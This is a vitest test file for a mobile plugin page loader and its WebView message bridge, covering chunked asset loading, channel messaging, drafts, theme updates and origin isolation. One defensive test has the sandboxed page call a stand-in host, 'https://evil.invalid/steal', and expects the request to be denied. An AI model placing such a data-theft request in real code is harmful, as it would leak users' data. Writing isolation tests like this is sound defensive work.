import { describe, expect, it, vi } from "vitest";
import { createRequire } from "node:module";
const { JSDOM } = createRequire(import.meta.url)("jsdom");
import { pluginPageHtml } from "../plugins/pluginPageHtml";
import { loadPluginPageAssets } from "../plugins/pluginClient";
import type { PluginPageDocument } from "@cindy/device-link";

const document: PluginPageDocument = {
  pageId: "page",
  pluginId: "practice",
  title: "Practice",
  entry: "panel.html",
  surface: "panel",
  channels: ["practice-ui"],
  files: [],
};
describe("mobile plugin page transport", () => {
  it("assembles chunk boundaries without corrupting base64 and stops when the owner changes", async () => {
    const data = Buffer.alloc(48 * 1024 + 13, 65);
    const doc = {
      ...document,
      files: [{ path: "panel.html", mime: "text/html", size: data.length }],
    };
    const read = vi.fn(async (_path: string, offset: number) => ({
      mime: "text/html",
      base64: data.subarray(offset, offset + 48 * 1024).toString("base64"),
    }));
    const loaded = await loadPluginPageAssets(doc, read, () => true);
    expect(Buffer.from(loaded["panel.html"].base64, "base64")).toEqual(data);
    expect(read).toHaveBeenCalledTimes(2);
    await expect(loadPluginPageAssets(doc, read, () => false)).rejects.toThrow(
      "PLUGIN_PAGE_CLOSED",
    );
  });
  it("runs the channel bridge in the actual generated document, denies other origins and updates theme without reloading", async () => {
    const html =
      '<html><head></head><body><button id="saved">Keep my draft</button></body></html>';
    const messages: string[] = [];
    const dom = new JSDOM(
      pluginPageHtml({
        document,
        assets: {
          "panel.html": {
            mime: "text/html",
            base64: Buffer.from(html).toString("base64"),
          },
        },
        theme: "light",
        colors: { surface: "#fff" },
      }),
      {
        runScripts: "dangerously",
        url: "https://plugin.invalid/",
        pretendToBeVisual: true,
        beforeParse(window: Window & typeof globalThis) {
          Object.assign(window, {
            ReactNativeWebView: {
              postMessage: (message: string) => messages.push(message),
            },
            TextEncoder,
            TextDecoder,
            Request,
            Response,
            fetch,
          });
        },
      },
    );
    try {
      await new Promise((resolve) => setTimeout(resolve, 0));
      const window = dom.window;
      const channel = window.eval("new BroadcastChannel('practice-ui')");
      channel.postMessage({ requestId: "stable", save: true });
      expect(messages.map((message) => JSON.parse(message))).toContainEqual({
        type: "post",
        pageId: "page",
        channel: "practice-ui",
        data: { requestId: "stable", save: true },
      });
      const receive = vi.fn();
      channel.onmessage = receive;
      const payload = JSON.stringify({
        type: "events",
        events: [
          { sequence: 1, channel: "practice-ui", data: { saved: true } },
        ],
      });
      window.dispatchEvent(
        new window.MessageEvent("message", { data: payload }),
      );
      window.document.dispatchEvent(
        new window.MessageEvent("message", { data: payload }),
      );
      expect(receive).toHaveBeenCalledTimes(1);
      const back = vi.fn(),
        lifecycle = vi.fn();
      const helper = window.eval("window.cindyMobile");
      helper.onBack(back);
      helper.onLifecycle(lifecycle);
      helper.setNavigation(true, "Course");
      window.dispatchEvent(
        new window.MessageEvent("message", {
          data: JSON.stringify({ type: "back" }),
        }),
      );
      window.dispatchEvent(
        new window.MessageEvent("message", {
          data: JSON.stringify({ type: "lifecycle", active: false }),
        }),
      );
      expect(back).toHaveBeenCalledTimes(1);
      expect(lifecycle).toHaveBeenCalledWith(false);
      const draft = helper.readDraft("learning.v1");
      const draftRequest = JSON.parse(messages.at(-1)!);
      expect(draftRequest).toMatchObject({
        type: "draft:get",
        key: "learning.v1",
        pageId: "page",
      });
      window.dispatchEvent(
        new window.MessageEvent("message", {
          data: JSON.stringify({
            type: "draft:reply",
            id: draftRequest.id,
            value: { answer: "a" },
          }),
        }),
      );
      await expect(draft).resolves.toEqual({ answer: "a" });
      expect(window.document.documentElement.dataset.mobile).toBe("true");
      expect(() =>
        window.eval("new BroadcastChannel('another-plugin')"),
      ).toThrow();
      await expect(window.fetch("https://evil.invalid/steal")).rejects.toThrow(
        "PLUGIN_ORIGIN_DENIED",
      );
      window.document.getElementById("saved")!.textContent = "Unsaved draft";
      window.dispatchEvent(
        new window.MessageEvent("message", {
          data: JSON.stringify({
            type: "theme",
            theme: "dark",
            colors: { surface: "#222" },
          }),
        }),
      );
      expect(window.document.documentElement.dataset.theme).toBe("dark");
      expect(window.document.getElementById("saved")!.textContent).toBe(
        "Unsaved draft",
      );
      expect(
        window.document
          .querySelector("meta[http-equiv]")
          ?.getAttribute("content"),
      ).toContain("connect-src 'none'");
    } finally {
      dom.window.close();
    }
  });
});
